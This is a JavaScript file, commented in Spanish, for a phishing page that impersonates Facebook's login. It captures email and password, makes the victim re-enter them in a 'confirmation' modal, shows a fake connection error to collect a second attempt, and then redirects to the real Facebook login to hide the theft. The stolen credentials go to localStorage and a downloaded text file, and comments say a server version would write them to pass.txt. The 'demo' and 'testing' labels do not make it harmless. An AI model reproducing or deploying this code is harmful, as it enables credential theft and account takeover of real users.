// Variables globales
let currentEmail = '';
let currentPassword = '';
let attemptCount = 0;

// Elementos del DOM
const loginForm = document.getElementById('loginForm');
const modal = document.getElementById('confirmModal');
const confirmBtn = document.getElementById('confirmBtn');
const cancelBtn = document.getElementById('cancelBtn');
const confirmEmail = document.getElementById('confirmEmail');
const confirmPassword = document.getElementById('confirmPassword');

// Event listeners
loginForm.addEventListener('submit', handleLogin);
confirmBtn.addEventListener('click', handleConfirmation);
cancelBtn.addEventListener('click', closeModal);

// Función principal de login
function handleLogin(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    
    if (!email || !password) {
        alert('Por favor, completa todos los campos');
        return;
    }
    
    // Guardar datos actuales
    currentEmail = email;
    currentPassword = password;
    
    // Mostrar modal de confirmación
    showModal();
}

// Mostrar modal
function showModal() {
    modal.style.display = 'block';
    confirmEmail.value = '';
    confirmPassword.value = '';
    confirmEmail.focus();
}

// Cerrar modal
function closeModal() {
    modal.style.display = 'none';
}

// Manejar confirmación
function handleConfirmation() {
    const confEmail = confirmEmail.value;
    const confPassword = confirmPassword.value;
    
    if (!confEmail || !confPassword) {
        alert('Por favor, confirma todos los campos');
        return;
    }
    
    // Incrementar contador de intentos
    attemptCount++;
    
    // Guardar datos en archivo (simulado con localStorage para demo)
    saveCredentials(currentEmail, currentPassword, confEmail, confPassword);
    
    // Si es el segundo intento, redirigir a Facebook real
    if (attemptCount >= 2) {
        alert('Redirigiendo a Facebook...');
        // Redirigir al Facebook real
        window.location.href = 'https://www.facebook.com/login';
    } else {
        // Mostrar error y pedir que intente de nuevo
        alert('Error de conexión. Por favor, intenta nuevamente.');
        closeModal();
        // Limpiar formulario
        document.getElementById('email').value = '';
        document.getElementById('password').value = '';
        document.getElementById('email').focus();
    }
}

// Función para guardar credenciales (simulada)
function saveCredentials(email, password, confEmail, confPassword) {
    const timestamp = new Date().toLocaleString();
    const data = {
        timestamp: timestamp,
        attempt: attemptCount,
        email: email,
        password: password,
        confirmEmail: confEmail,
        confirmPassword: confPassword,
        userAgent: navigator.userAgent,
        ip: 'Simulado - No disponible en cliente'
    };
    
    // Guardar en localStorage (en un servidor real se guardaría en pass.txt)
    let savedData = JSON.parse(localStorage.getItem('facebookCloneData') || '[]');
    savedData.push(data);
    localStorage.setItem('facebookCloneData', JSON.stringify(savedData));
    
    // También crear el contenido que se guardaría en pass.txt
    const textContent = formatForTextFile(data);
    console.log('Datos que se guardarían en pass.txt:');
    console.log(textContent);
    
    // Simular descarga del archivo (opcional)
    downloadTextFile(textContent, `facebook_data_${Date.now()}.txt`);
}

// Formatear datos para archivo de texto
function formatForTextFile(data) {
    return `
=== FACEBOOK LOGIN DATA ===
Fecha y Hora: ${data.timestamp}
Intento #: ${data.attempt}
Email/Usuario: ${data.email}
Contraseña: ${data.password}
Email Confirmado: ${data.confirmEmail}
Contraseña Confirmada: ${data.confirmPassword}
User Agent: ${data.userAgent}
IP: ${data.ip}
============================

`;
}

// Función para descargar archivo de texto
function downloadTextFile(content, filename) {
    const element = document.createElement('a');
    const file = new Blob([content], { type: 'text/plain' });
    element.href = URL.createObjectURL(file);
    element.download = filename;
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}

// Cerrar modal al hacer clic fuera de él
window.onclick = function(event) {
    if (event.target === modal) {
        closeModal();
    }
}

// Función para ver datos guardados (para testing)
function viewSavedData() {
    const savedData = JSON.parse(localStorage.getItem('facebookCloneData') || '[]');
    console.log('Datos guardados:', savedData);
    return savedData;
}

// Función para limpiar datos guardados (para testing)
function clearSavedData() {
    localStorage.removeItem('facebookCloneData');
    console.log('Datos limpiados');
}

// Hacer funciones disponibles globalmente para testing
window.viewSavedData = viewSavedData;
window.clearSavedData = clearSavedData;